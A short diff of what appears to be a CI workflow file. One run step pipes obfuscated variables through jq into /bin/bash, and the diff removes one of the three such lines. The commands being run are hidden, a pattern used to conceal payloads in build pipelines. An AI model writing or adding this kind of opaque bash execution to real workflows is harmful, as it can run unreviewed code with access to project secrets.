@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
           echo $vumlz8 | jq -r .horek241 | /bin/bash
-          echo $us17692 | jq -r .tiunw608 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
